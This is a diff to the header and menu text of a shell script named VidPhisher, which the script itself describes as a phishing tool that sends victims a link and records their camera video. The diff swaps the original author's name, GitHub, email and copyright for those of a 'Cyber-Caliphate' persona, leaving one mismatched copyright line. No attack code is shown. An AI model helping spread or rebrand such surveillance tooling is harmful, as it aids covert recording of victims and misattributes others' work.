@@ -3,13 +3,13 @@
 # VidPhisher
 # Version    : 1.2
 # Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
+# Author     : CYBER-CALIPHATE
+# Github     : https://github.com/Cyber-Caliphate16 
+# Email      : cybercaliphate420@gmail.com@gmail.com
 # Credits    : TechChipNet, RecordRTC
 # Date       : 05-06-2022
 # License    : GPLv3
-# Copyright  : KasRoudra 2022
+# Copyright  : CyberCaliphate 2022
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -85,7 +85,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
+Copyright (C) 2022 KasRoudra (https://github.com/Cyber-Caliphate16)
 LicenseInfo
 
 
@@ -124,7 +124,7 @@ ${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__|
 ${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
 ${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
 ${red}                                          [v${version}] 
-${blue}                                  [By KasRoudra] 
+${blue}                                  [By Cyber-Caliphate ] 
 "
 
 ngrok_help="
@@ -632,10 +632,10 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Video Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[Cyber-Caliphate]
+$red[Github]     ${cyan} :[https://github.com/Cyber-Caliphate16]
+$red[Telegram]  ${cyan} :[https://t.me/nightfury090]
+$red[Email]      ${cyan} :[cybercaliphate420@gmail.com]"
         printf "$vp_prompt"
         read about
     elif echo $option | grep -q "m"; then
